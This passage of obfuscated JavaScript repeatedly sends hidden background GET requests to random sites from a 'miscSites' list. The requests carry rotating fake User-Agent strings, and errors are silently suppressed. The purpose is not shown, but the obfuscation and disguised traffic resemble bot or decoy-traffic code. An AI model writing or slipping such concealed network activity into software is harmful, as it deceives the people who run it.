      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2 * 0x13d7 + 0x318c + 0x117a) * getRandomInt(-0x37 * 0x3b + 0x5 * -0x4cf + 0x229 * 0x11, 0x56 * 0x35 + -0x8 * 0x3a0 + 0xb37));
}, -0x22e1 * -0x1 + 0x8b * 0x12 + 0x4eb * -0x9);